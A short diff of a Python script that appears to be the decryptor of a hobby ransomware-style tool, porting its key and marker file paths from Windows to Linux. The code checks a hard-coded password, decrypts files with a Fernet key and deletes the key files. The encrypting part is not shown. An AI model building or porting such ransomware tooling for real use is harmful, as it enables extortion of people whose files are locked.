@@ -5,7 +5,7 @@ from PyQt6.QtWidgets import *
 from cryptography.fernet import Fernet
 
 # Check if encrypted or not
-if not os.path.exists(f"C:\\Users\\Public\\encrypted.key"):
+if not os.path.exists(f"/home/encrypted.key"):
 	exit("Decrypted ya 3beet")
 
 
@@ -74,7 +74,7 @@ password = "randompassword"
 if gui.entered == password:
 
 
-	with open(f"C:\\Users\\Public\\thekey.key", "rb") as thekey:
+	with open(f"/home/thekey.key", "rb") as thekey:
 
 		secretkey = thekey.read()
 
@@ -92,9 +92,9 @@ if gui.entered == password:
 
 	print("Congrats, Your files have been decrypted <3")
 
-	os.remove(f'C:\\Users\\Public\\encrypted.key')
+	os.remove(f'/home/encrypted.key')
 
-	os.remove(f'C:\\Users\\Public\\thekey.key')
+	os.remove(f'/home/thekey.key')
 
 else:
 
